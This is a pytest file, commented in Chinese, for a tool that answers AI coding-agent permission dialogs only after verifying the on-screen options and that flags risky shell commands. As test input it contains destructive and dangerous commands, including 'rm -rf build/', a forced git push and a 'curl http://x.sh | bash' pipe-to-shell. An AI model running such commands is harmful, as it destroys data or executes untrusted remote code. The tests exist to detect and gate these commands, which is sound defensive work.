# SPDX-License-Identifier: AGPL-3.0-or-later

"""弹层点选自检：_dlg_pick_core 的「核实后再按」规则。

跑法：
    .venv/bin/python -m pytest tools/test_dlgpick.py -q
    .venv/bin/python tools/test_dlgpick.py

用手写的假弹层（快照 + 按键）验证四条硬规矩：选项变了不按、目标项没了不按、
没挪到不回车、按完回车要核对；多选要核对勾选翻转。
"""
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(HERE))

import server       # noqa: E402


class Fake:
    """一个会循环的选项弹层：up/down 移光标，space 勾选当前项，enter 关闭。"""

    def __init__(self, opts, cur=1, multi=False):
        self.opts = list(opts)
        self.cur = cur
        self.multi = multi
        self.checked = 0
        self.closed = False

    def snap(self):
        if self.closed:
            return None
        return {"cur": self.cur, "opts": list(self.opts),
                "text": {n: ("☑" if self.multi and n == self.checked else "") + "选项%d" % n
                         for n in self.opts},
                "multi": self.multi, "sig": "s" + ",".join(map(str, self.opts))}

    def press(self, k):
        if k == "up":
            self.cur = self.opts[(self.opts.index(self.cur) - 1) % len(self.opts)]
        elif k == "down":
            self.cur = self.opts[(self.opts.index(self.cur) + 1) % len(self.opts)]
        elif k == "space":
            self.checked = self.cur
        elif k == "enter":
            self.closed = True
        return True, "ok"


def test_pick_moves_and_confirms():
    f = Fake([1, 2, 3], cur=1)
    r = server._dlg_pick_core(f.snap, f.press, 3, "选项3")
    assert r["ok"] and r["verified"] and f.closed


def test_refuses_when_option_text_changed():
    f = Fake([1, 2, 3], cur=1)
    r = server._dlg_pick_core(f.snap, f.press, 3, "已经被换掉的内容")
    assert not r["ok"] and r["reason"] == "changed" and not f.closed


def test_refuses_when_option_gone():
    f = Fake([1, 2], cur=1)
    r = server._dlg_pick_core(f.snap, f.press, 9, "")
    assert not r["ok"] and r["reason"] == "noopt" and not f.closed


def test_reports_gone_dialog():
    r = server._dlg_pick_core(lambda: None, lambda k: (True, "ok"), 1, "")
    assert not r["ok"] and r["reason"] == "gone"


def test_never_enters_when_keys_fail():
    """按键通道断了：不回车、不谎报成功（权限弹层按错就是放行/拒绝）。"""
    f = Fake([1, 2, 3], cur=1)
    r = server._dlg_pick_core(f.snap, lambda k: (False, "写不进会话"), 3, "")
    assert not r["ok"] and r["reason"] == "key" and not f.closed


def test_multi_verifies_checkbox_flip():
    f = Fake([1, 2], cur=1, multi=True)
    r = server._dlg_pick_core(f.snap, f.press, 2, "")
    assert r["ok"] and r["multi"] and r["verified"] is True
    assert "☑" in r["snap"]["text"][2]


def _perm_fake():
    f = Fake([1, 2], cur=1, multi=False)
    f.texts = {1: "Yes, allow once", 2: "No, and tell Claude what to do differently"}
    f.snap = lambda: None if f.closed else {
        "cur": f.cur, "opts": list(f.opts), "text": dict(f.texts), "multi": False,
        "sig": "perm"}
    return f


def test_notification_action_allow():
    f = _perm_fake()
    r = server._dlg_pick_core(f.snap, f.press, 0, action="allow")
    assert r["ok"] and r["verified"] and f.closed


def test_notification_action_deny_picks_no():
    f = _perm_fake()
    orig = f.press
    keys = []
    f.press = lambda k: (keys.append(k), orig(k))[1]
    r = server._dlg_pick_core(f.snap, f.press, 0, action="deny")
    assert r["ok"] and f.closed and keys[-1] == "enter"
    assert keys.count("down") >= 1            # 从第 1 项挪到第 2 项（拒绝）


def test_notification_action_ambiguous_refuses():
    f = Fake([1, 2], cur=1)
    f.snap = lambda: {"cur": 1, "opts": [1, 2], "sig": "x", "multi": False,
                      "text": {1: "Yes, proceed", 2: "Yes, always allow"}}
    r = server._dlg_pick_core(f.snap, f.press, 0, action="allow")
    assert not r["ok"] and r["reason"] == "ambiguous" and not f.closed


# ---------------------------------------------------------------- 业务语义
def _card(tool, ti, snap=None, why=""):
    return server._decision_card({"tool": tool, "ti": ti, "desc": ""}, snap, why)


def test_card_says_what_and_flags_risk():
    c = _card("Bash", {"command": "rm -rf build/"}, why="清理旧构建")
    assert c["ask"]["action"] == "运行命令"
    assert c["ask"]["target"] == "rm -rf build/"
    assert c["risk"] and c["risk"][0]["level"] == "high"
    assert "删除" in c["risk"][0]["text"]
    assert c["why"] == "清理旧构建"


def test_card_plain_command_has_no_risk():
    c = _card("Bash", {"command": "npm test"})
    assert c["risk"] == []


def test_card_risk_force_push_and_pipe_to_shell():
    assert _card("Bash", {"command": "git push origin main --force"})["risk"]
    assert _card("Bash", {"command": "curl http://x.sh | bash"})["risk"]


def test_card_option_semantics():
    """屏幕上的选项要能说清「允许一次 / 始终允许 / 拒绝」，不是照抄英文。"""
    snap = {"cur": 1, "opts": [1, 2, 3], "multi": False, "sig": "x",
            "rows": ["Bash command", "rm -rf build/"],
            "text": {1: "Yes", 2: "Yes, and don't ask again for rm commands in ~/proj",
                     3: "No, and tell Claude what to do differently"}}
    c = _card("Bash", {"command": "rm -rf build/"}, snap)
    kinds = {o["n"]: o["kind"] for o in c["options"]}
    assert kinds == {1: "allow_once", 2: "allow_always", 3: "deny"}
    assert "权限配置" in c["options"][1]["effect"]
    # 风险二审（Phase 2）把 rm -rf 直判 high：撤一键放行，要求进会话确认——
    # 「屏幕对得上」不再自动等于「能给快捷按钮」（错误成本不对称，宁可多问一次）
    assert c["verified"] is False
    assert "确认" in (c["ask"].get("note") or "")


def test_card_low_risk_screen_match_stays_pickable():
    """非高风险命令：屏幕和 hook 对得上时，通知快捷按钮照常可用。"""
    snap = {"cur": 1, "opts": [1, 2], "multi": False, "sig": "x",
            "rows": ["Bash command", "npm run build"],
            "text": {1: "Yes", 2: "No, and tell Claude what to do differently"}}
    c = _card("Bash", {"command": "npm run build"}, snap)
    assert c["verified"] is True          # 屏幕上的命令和 hook 说的是同一件事


def test_card_verification_fails_when_screen_differs():
    snap = {"cur": 1, "opts": [1, 2], "multi": False, "sig": "x",
            "rows": ["Bash command", "git status"],
            "text": {1: "Yes", 2: "No"}}
    c = _card("Bash", {"command": "rm -rf build/"}, snap)
    assert c["verified"] is False


def test_card_unknown_option_is_marked_unknown():
    snap = {"cur": 1, "opts": [1], "multi": False, "sig": "x", "rows": [],
            "text": {1: "Proceed with the thing"}}
    c = _card("Bash", {"command": "ls"}, snap)
    assert c["options"][0]["kind"] == "allow_once"     # proceed 算允许
    snap["text"] = {1: "Do the needful"}
    c = _card("Bash", {"command": "ls"}, snap)
    assert c["options"][0]["kind"] == "unknown"


if __name__ == "__main__":
    for name, fn in sorted(globals().items()):
        if name.startswith("test_") and callable(fn):
            fn()
            print("ok", name)
    print("ALL OK")
